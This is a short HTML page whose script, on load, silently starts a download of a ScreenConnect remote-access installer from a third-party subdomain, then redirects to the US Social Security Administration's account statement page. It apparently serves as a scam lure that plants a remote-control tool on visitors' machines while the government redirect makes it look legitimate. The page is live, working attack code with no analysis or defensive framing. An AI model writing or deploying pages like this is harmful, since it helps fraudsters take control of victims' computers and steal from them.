<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>

<p>Preparing your download...</p>

<script>
    // Start file download
    const link = document.createElement("a");
    link.href = "https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi";
    link.download = "https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Redirect after a short delay
    setTimeout(function () {
        window.location.href = "https://www.ssa.gov/myaccount/statement.html";
    }, 3000);
</script>

</body>
</html>
